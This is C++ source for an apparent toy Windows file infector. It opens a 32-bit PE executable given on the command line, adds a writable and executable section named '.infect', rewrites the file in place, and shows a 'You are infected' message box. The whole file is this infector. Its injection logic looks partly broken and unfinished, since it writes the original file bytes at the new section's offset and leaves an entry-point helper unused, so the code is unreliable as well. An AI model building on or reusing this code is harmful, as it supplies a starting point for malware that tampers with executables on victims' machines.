#include <windows.h>
#include <stdio.h>
#include <filesystem>
#include <imagehlp.h>
#include <winternl.h>
#include <cstddef>
#include <iostream>
#pragma comment(lib, "User32.lib")

using namespace std;
using std::byte;
DWORD align(DWORD size, DWORD align, DWORD address)
{
    if (!(size % align))
        return address + size;
    return address + (size / align + 1) * align;
}



bool CreateNewSection(HANDLE &hFile, PIMAGE_NT_HEADERS &pNtHeader, BYTE *pByte, DWORD &fileSize, DWORD &bytesWritten, DWORD sizeOfSection)
{
     
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeader);
    WORD sectionCount = pNtHeader->FileHeader.NumberOfSections;
    const char sectionName[] = ".infect";
    for (int order = 0; order < sectionCount; order++) {
        PIMAGE_SECTION_HEADER currentSection = pSectionHeader + order;
        if (!strcmp((char*)currentSection->Name, sectionName)) {
            cerr << "PE section already exists" << endl;
            CloseHandle(hFile);
            return false;
        }
    } 
    ZeroMemory(&pSectionHeader[sectionCount], sizeof(IMAGE_SECTION_HEADER));
    CopyMemory(&pSectionHeader[sectionCount].Name, ".infect", 8);

    pSectionHeader[sectionCount].Misc.VirtualSize = align(sizeOfSection, pNtHeader->OptionalHeader.SectionAlignment, 0);
    pSectionHeader[sectionCount].VirtualAddress = align(pSectionHeader[sectionCount - 1].Misc.VirtualSize, pNtHeader->OptionalHeader.SectionAlignment, pSectionHeader[sectionCount - 1].VirtualAddress);
    pSectionHeader[sectionCount].SizeOfRawData = align(sizeOfSection, pNtHeader->OptionalHeader.FileAlignment, 0);
    pSectionHeader[sectionCount].PointerToRawData = align(pSectionHeader[sectionCount - 1].SizeOfRawData, pNtHeader->OptionalHeader.FileAlignment, pSectionHeader[sectionCount - 1].PointerToRawData);
    pSectionHeader[sectionCount].Characteristics = 0xE00000E0;

    /*
    0xE00000E0 = IMAGE_SCN_MEM_WRITE |
                IMAGE_SCN_CNT_CODE  |
                IMAGE_SCN_CNT_UNINITIALIZED_DATA  |
                IMAGE_SCN_MEM_EXECUTE |
                IMAGE_SCN_CNT_INITIALIZED_DATA |
                IMAGE_SCN_MEM_READ
    */

    SetFilePointer(hFile, pSectionHeader[sectionCount].PointerToRawData + pSectionHeader[sectionCount].SizeOfRawData, NULL, FILE_BEGIN);
    SetEndOfFile(hFile);
    pNtHeader->OptionalHeader.SizeOfImage = pSectionHeader[sectionCount].VirtualAddress + pSectionHeader[sectionCount].Misc.VirtualSize;
    pNtHeader->FileHeader.NumberOfSections += 1;
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    WriteFile(hFile, pByte, fileSize, &bytesWritten, NULL);
    return true;
}

bool InfectSection(HANDLE& hFile, PIMAGE_NT_HEADERS pNtHeader, BYTE* pByte, DWORD fileSize, DWORD byteWritten) {

    // Insert code into last section
    PIMAGE_SECTION_HEADER firstSection = IMAGE_FIRST_SECTION(pNtHeader);
    PIMAGE_SECTION_HEADER lastSection = firstSection + (pNtHeader->FileHeader.NumberOfSections - 1);

    SetFilePointer(hFile, lastSection->PointerToRawData, NULL, FILE_BEGIN);
    MessageBoxW(NULL, (LPCWSTR)L"You are infected", (LPCWSTR)L"", MB_ICONERROR |MB_OK);
    WriteFile(hFile, pByte, fileSize, &byteWritten, 0);
    CloseHandle(hFile);
    return true;
}


uint32_t GetEntryPoint(PIMAGE_NT_HEADERS pNtHeader, BYTE* pByte) {
    PIMAGE_SECTION_HEADER first = IMAGE_FIRST_SECTION(pNtHeader);
    PIMAGE_SECTION_HEADER last = first + pNtHeader->FileHeader.NumberOfSections - 1;
    pByte += last->PointerToRawData + 0x100;
    uint32_t originEntryPoint = *(uint32_t*)(pByte + 14);
    return originEntryPoint;
}


bool OpenFile(const char *fileName)
{
    HANDLE hFile = CreateFileA(fileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        cerr << "Error: Invalid file, try another one" << endl;
        return false;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (!fileSize)
    {
        CloseHandle(hFile);
        cerr << "Error: File " << fileName << " empty, try another one" << endl;
        return false;
    }

    // Buffer to allocate
    BYTE *pByte = new BYTE[fileSize];
    DWORD byteWritten;

    if (!ReadFile(hFile, pByte, fileSize, &byteWritten, NULL))
    {
        cerr << "Error: Fail to read file " << fileName << endl;
    }

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pByte;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
    {
        CloseHandle(hFile);
        cerr << "Error: Invalid path or PE format" << endl;
        return false;
    }

    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pByte + pDosHeader->e_lfanew);
    if (pNtHeader->FileHeader.Machine != IMAGE_FILE_MACHINE_I386)
    {
        CloseHandle(hFile);
        cerr << "Error: " << fileName << " is PE32+, this version works only with PE32" << endl;
        return false;
    }

    if (!CreateNewSection(hFile, pNtHeader, pByte, fileSize, byteWritten, 400))
    {
        cerr << "Error: Fail to create new section into " << fileName << endl;
        return false;
    }

    // Insert data into the last section
    if (!InfectSection(hFile, pNtHeader, pByte, fileSize, byteWritten))
    {
        cerr << "Error: Fail to infect Message Box into " << fileName << endl;
        return false;
    }

    cerr << "Success to infect Message Box into " << fileName << endl;

    CloseHandle(hFile);
    return true;
}


int main(int argc, char *argv[])
{
	if (!OpenFile(argv[1]))
		{
			cerr << "Error: invalid file" << endl;
		}

    return 0;
}
